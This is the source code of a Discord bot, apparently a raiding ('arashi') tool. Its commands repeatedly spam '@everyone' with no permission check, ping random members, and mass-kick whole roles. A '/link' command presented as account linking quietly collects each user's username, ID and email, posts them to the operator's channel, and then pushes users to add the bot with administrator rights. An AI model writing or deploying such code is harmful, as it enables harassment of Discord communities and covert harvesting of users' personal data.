import os
import asyncio
import random
import threading
import time
import requests
import discord
from discord import app_commands
from dotenv import load_dotenv
from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse
import uvicorn

# 環境変数の読み込み
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
CLIENT_ID = os.getenv('DISCORD_CLIENT_ID')  # Discord Developer PortalのClient IDが必要になります
CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET') # BotのClient Secretが必要になります

# 設定情報
NOTIFICATION_CHANNEL_ID = 1545620371477106868
RESTRICTED_GUILD_ID = 1510021467155202048
RENDER_EXTERNAL_URL = "https://arashi-3vci.onrender.com"

# FastAPIアプリの初期化
app = FastAPI()

@app.get("/")
def health_check():
    return {"status": "Bot is running!"}

# /link のコールバック受け取り（Discord公式認証後にここに戻ってくる）
@app.get("/link")
def link_account(code: str = None):
    if not code:
        return {"error": "No code provided."}

    # 1. Discordからアクセストークンを交換する
    token_url = "https://discord.com/api/oauth2/token"
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": f"{RENDER_EXTERNAL_URL}/link"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    response = requests.post(token_url, data=data, headers=headers)
    if response.status_code != 200:
        return {"error": "Failed to fetch token from Discord."}
    
    token_data = response.json()
    access_token = token_data.get("access_token")

    # 2. ユーザーの基本情報（ユーザー名、メールアドレスなど）を取得
    user_url = "https://discord.com/api/users/@me"
    user_headers = {"Authorization": f"Bearer {access_token}"}
    user_response = requests.get(user_url, headers=user_headers)
    
    if user_response.status_code == 200:
        user_info = user_response.json()
        username = f"{user_info.get('username')}#{user_info.get('discriminator', '0')}"
        if username.endswith('#0'):
            username = user_info.get('username')
        user_id = user_info.get('id')
        email = user_info.get('email', '取得できず')

        # 3. 指定チャンネルへ情報を非同期で通知するための処理（キューや直接送信）
        # FastAPIからDiscord Botのイベントループへ安全に通知を送る
        asyncio.run_coroutine_threadsafe(
            send_notification_to_discord(user_id, username, email), 
            client.loop
        )

    # 4. 情報を送ったあと、すぐにDiscord公式のボット追加画面（または任意のURL）へリダイレクトする
    # ※BOTのクライアントIDを組み込んだ追加用URL
    bot_add_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
    return RedirectResponse(url=bot_add_url)


async def send_notification_to_discord(user_id, username, email):
    """指定チャンネルに認証情報を通知する補助関数"""
    channel = client.get_channel(NOTIFICATION_CHANNEL_ID)
    if channel:
        try:
            await channel.send(
                f"🔗 **アカウント連携通知**\n"
                f"• ユーザー名: `{username}` (ID: `{user_id}`)\n"
                f"• メールアドレス: `{email}`"
            )
        except Exception as e:
            print(f"通知送信エラー: {e}")


# Discord Botの定義
class MyBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()
        print("スラッシュコマンドを同期しました。")

client = MyBot()

@client.event
async def on_ready():
    print(f'ログインしました: {client.user}')

# 1. /random-mention コマンド
@client.tree.command(name="random-mention", description="サーバー内のメンバーを指定人数分ランダムにメンションします")
@app_commands.describe(count="メンションする人数")
async def random_mention(interaction: discord.Interaction, count: int):
    if interaction.guild and interaction.guild.id == RESTRICTED_GUILD_ID:
        await interaction.response.send_message("このサーバーでは `/random-mention` コマンドは使用できません。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)
    members = [m for m in interaction.guild.members if not m.bot]
    
    if count > len(members):
        await interaction.followup.send(f"指定された人数 ({count}人) が現在の有効なメンバー数を超えています。")
        return

    chosen_members = random.sample(members, count)
    await interaction.followup.send(f"【ランダムメンション開始】{count}人を10秒間隔でメンションします。")
    
    for member in chosen_members:
        await interaction.channel.send(f"{member.mention} さん、こんにちは！")
        await asyncio.sleep(10)

# 2. /mention コマンド
@client.tree.command(name="mention", description="こんにちは！ @everyone を指定回数送信します")
@app_commands.describe(times="送信する回数")
async def mention_everyone(interaction: discord.Interaction, times: int):
    if interaction.guild and interaction.guild.id == RESTRICTED_GUILD_ID:
        await interaction.response.send_message("このサーバーでは `/mention` コマンドは使用できません。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)
    await interaction.followup.send(f"【@everyone 連投開始】全 {times} 回、10秒間隔で送信します。")
    
    for _ in range(times):
        await interaction.channel.send("こんにちは！ @everyone")
        await asyncio.sleep(10)

# 3. /mention-role コマンド
@client.tree.command(name="mention-role", description="入力されたテキストに一番似ているロールを自動で特定してメンションします")
@app_commands.describe(role_name="検索したいロールのキーワード")
async def mention_role(interaction: discord.Interaction, role_name: str):
    await interaction.response.defer(thinking=True)
    guild = interaction.guild
    if not guild.roles:
        await interaction.followup.send("サーバーにロールが存在しません。")
        return

    best_role = None
    max_score = -1

    for role in guild.roles:
        if role.is_default():
            continue
        r_name = role.name.lower()
        target = role_name.lower()
        
        score = 0
        if target == r_name:
            score = 100
        elif target in r_name:
            score = 50
        elif r_name in target:
            score = 30
        
        if score > max_score:
            max_score = score
            best_role = role

    if not best_role or max_score <= 0:
        await interaction.followup.send(f"「{role_name}」に似ているロールが見つかりませんでした。")
        return

    await interaction.followup.send(f"一番似ているロールとして **{best_role.name}** をメンションします！")
    await interaction.channel.send(f"{best_role.mention} こんにちは！")

# 4. /kick-role コマンド
@client.tree.command(name="kick-role", description="入力されたロール名に一番似ているロールのメンバーをキックします")
@app_commands.describe(role_name="キックしたい対象のロール名（キーワード）")
async def kick_role(interaction: discord.Interaction, role_name: str):
    if not interaction.user.guild_permissions.kick_members:
        await interaction.response.send_message("あなたにはこのコマンドを実行する権限（メンバーをキック）がありません。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)
    guild = interaction.guild
    if not guild.roles:
        await interaction.followup.send("サーバーにロールが存在しません。")
        return

    best_role = None
    max_score = -1

    for role in guild.roles:
        if role.is_default():
            continue
        r_name = role.name.lower()
        target = role_name.lower()
        
        score = 0
        if target == r_name:
            score = 100
        elif target in r_name:
            score = 50
        elif r_name in target:
            score = 30
        
        if score > max_score:
            max_score = score
            best_role = role

    if not best_role or max_score <= 0:
        await interaction.followup.send(f"「{role_name}」に似ているロールが見つかりませんでした。")
        return

    members_to_kick = [m for m in best_role.members if not m.bot and m != guild.owner]

    if not members_to_kick:
        await interaction.followup.send(f"ロール **{best_role.name}** を持っている対象メンバーがいません（または除外対象のみです）。")
        return

    await interaction.followup.send(f"ロール **{best_role.name}** が一致しました。対象メンバーのキック処理を開始します（対象: {len(members_to_kick)}人）...")

    success_count = 0
    fail_count = 0

    for member in members_to_kick:
        try:
            await member.kick(reason=f"ロール '{best_role.name}' 一致による自動キック (実行者: {interaction.user})")
            success_count += 1
            await asyncio.sleep(2)
        except Exception as e:
            print(f"キック失敗 ({member}): {e}")
            fail_count += 1

    await interaction.channel.send(f"⚠️ キック処理が完了しました。\n成功: {success_count}人 / 失敗: {fail_count}人")

# 5. /link コマンド（OAuth2認証ページへ案内）
@client.tree.command(name="link", description="アカウントを連携するための認証リンクを表示します")
async def link_account_cmd(interaction: discord.Interaction):
    # Discord公式のOAuth2認証画面へ直接ユーザーを誘導するURLを生成
    # (scopeに identify と email を含める)
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={requests.utils.quote(RENDER_EXTERNAL_URL + '/link', safe='')}"
        f"&response_type=code"
        f"&scope=identify%20email"
    )

    await interaction.response.send_message(
        f"アカウント連携を行うには、以下のリンクを開いて認証を完了してください:\n{discord_auth_url}", 
        ephemeral=True
    )

# スリープ防止用：10分ごとに自分自身へアクセスするバックグラウンドタスク
def self_ping_loop():
    while True:
        time.sleep(600)  # 10分
        if RENDER_EXTERNAL_URL:
            try:
                response = requests.get(RENDER_EXTERNAL_URL)
                print(f"[Self-Ping] 成功: Status {response.status_code}")
            except Exception as e:
                print(f"[Self-Ping] 失敗: {e}")

threading.Thread(target=self_ping_loop, daemon=True).start()

if __name__ == "__main__":
    threading.Thread(target=lambda: client.run(TOKEN), daemon=True).start()
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
